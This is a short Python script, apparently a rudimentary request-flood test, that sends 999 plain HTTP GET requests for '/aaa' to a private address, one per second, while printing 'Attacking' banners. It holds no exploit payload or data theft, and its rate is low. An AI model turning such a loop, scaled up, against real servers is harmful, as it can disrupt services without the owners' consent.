import socket, sys, os
import time

ip = '192.168.185.3'
what = 'aaa'
port = 80

print("][ Attacking " + ip + " ... ][")
print("injecting " + what)


def attack(i):
    # pid = os.fork()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    print(">> GET /" + what + " HTTP/1.1 | packet: " + str(i))
    s.send(b"GET /" + what.encode() + b" HTTP/1.1\r\n")
    s.send(b"Host: " + ip.encode() + b"\r\n\r\n")
    s.close()


for i in range(1, 1000):
    attack(i)
    time.sleep(1)

